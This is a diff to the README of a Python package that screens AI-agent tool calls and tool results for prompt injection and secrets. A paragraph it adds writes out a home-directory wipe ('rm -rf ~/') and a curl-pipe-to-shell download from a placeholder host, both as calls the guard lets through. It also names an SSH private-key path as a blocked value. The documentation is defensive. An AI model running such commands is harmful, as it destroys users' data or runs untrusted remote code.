@@ -14,7 +14,7 @@
 
 **For:** developers building their own agents with LangChain, CrewAI, LlamaIndex or plain Python tool calling.
 
-> **Using Claude Code, Codex CLI, Cursor or OpenCode?** This Python package does not protect them. Run `npx -y zn-gate init` in your own terminal instead (it needs Node.js 18 or later): see [Install](https://github.com/usezn/zn#install).
+> **Using Claude Code, Codex CLI, Cursor or OpenCode?** This Python package does not protect them. Run `npx -y zn-gate init` in your own terminal instead (it needs Node.js 18 or later; 22 LTS is recommended, and the Claude Code plugin needs 20.12 or later): see [Install](https://github.com/usezn/zn#install).
 
 ---
 
@@ -22,12 +22,12 @@
 
 Install it in a virtual environment. Many recent Linux systems, and Homebrew's Python on macOS, refuse `pip install` outside one, with an "externally-managed-environment" error:
 
+On Debian and Ubuntu, `python3 -m venv` needs the `python3-venv` package first: `sudo apt install python3-venv`.
+
 ```bash
 python3 -m venv .venv
 .venv/bin/pip install zn-gate      # Windows: .venv\Scripts\pip install zn-gate
 ```
-
-On Debian and Ubuntu, `python3 -m venv` needs the `python3-venv` package first: `sudo apt install python3-venv`.
 
 Inside an environment you already use (your project's virtualenv, Poetry, uv), `pip install zn-gate` is enough. Python 3.10 or later (CI tests 3.10 to 3.13). Zero runtime dependencies.
 
@@ -41,6 +41,7 @@ Inside an environment you already use (your project's virtualenv, Poetry, uv), `
 
 ## Check that it works
 
+<!-- snippet-test -->
 ```python
 from zn_gate import sanitize_tool_result
 
@@ -56,6 +57,7 @@ print(out["sanitized_content"])
 
 `AKIAIOSFODNN7EXAMPLE` is AWS's documentation example key. Nothing was sent over the network.
 
+<!-- snippet-test -->
 ```python
 from zn_gate import evaluate
 
@@ -101,6 +103,7 @@ A long text (over 1,000 characters) is checked by the cloud classifier in overla
 
 ### Guard a tool function
 
+<!-- snippet-test -->
 ```python
 from zn_gate import guard
 
@@ -114,8 +117,11 @@ print(get_user_profile("user_123"))
 
 Arguments are checked before the function runs; with `on_block="raise"` a blocked call raises `GuardBlockError`. `mask_secrets` is off by default in `@guard`.
 
+`@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
+
 ### LangChain / LangGraph
 
+<!-- snippet-test -->
 ```python
 from zn_gate.integrations import ZnGuardCallbackHandler
 
@@ -125,6 +131,7 @@ handler = ZnGuardCallbackHandler(raise_on_injection=True, mask_secrets=True)
 
 ### CrewAI
 
+<!-- snippet-test -->
 ```python
 from zn_gate.integrations import guarded_tool
 
@@ -132,6 +139,8 @@ from zn_gate.integrations import guarded_tool
 def query_knowledge_base(query: str) -> str:
     return "Query result..."
 ```
+
+`@guarded_tool` also works on plain Python tool functions (Pydantic AI, Google ADK). Block messages name the target as `tool:<name>`; `framework="crewai"` makes it `crewai:<name>`.
 
 `check_result=True` also scans what the tool returns for prompt injection before the agent sees it (off by default, so existing tools behave as before).
 
@@ -157,6 +166,7 @@ providers:
 
 ### Local audit log
 
+<!-- snippet-test -->
 ```python
 from zn_gate import log_evidence, verify_evidence_ledger
 
@@ -192,6 +202,20 @@ We only publish numbers we can reproduce, with the method next to them.
 - `ZN_STRICT`: `1` also blocks the rules that only warn by default (same as `evaluate(text, strict=True)`; also `check_tool_call`, `check_tool_result` and `sanitize_tool_result` take `strict=True`).
 - `ZN_STAGE` / `ZN_API_URL`: cloud endpoint selection.
 - `NO_COLOR` (any non-empty value) or `TERM=dumb`: the command line output leaves out its symbols; the status words (ALLOW, BLOCK, clean, ...) stay.
+
+## Examples
+
+Runnable examples for the Python package, in [`examples/`](https://github.com/usezn/zn/tree/main/examples):
+
+| Example | Language | Framework | What it shows |
+|---|---|---|---|
+| [`python-basic`](https://github.com/usezn/zn/tree/main/examples/python-basic) | Python | None | Evaluate a prompt and guard a tool function. |
+| [`langchain-agent`](https://github.com/usezn/zn/tree/main/examples/langchain-agent) | Python | LangChain / LangGraph | Attach a callback handler that checks tool calls and results. |
+| [`crewai-agent`](https://github.com/usezn/zn/tree/main/examples/crewai-agent) | Python | CrewAI | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`llamaindex-agent`](https://github.com/usezn/zn/tree/main/examples/llamaindex-agent) | Python | LlamaIndex | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`openai-agents-sdk`](https://github.com/usezn/zn/tree/main/examples/openai-agents-sdk) | Python | OpenAI Agents SDK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`pydantic-ai-agent`](https://github.com/usezn/zn/tree/main/examples/pydantic-ai-agent) | Python | Pydantic AI | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`google-adk-agent`](https://github.com/usezn/zn/tree/main/examples/google-adk-agent) | Python | Google ADK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 
 ## FAQ
 
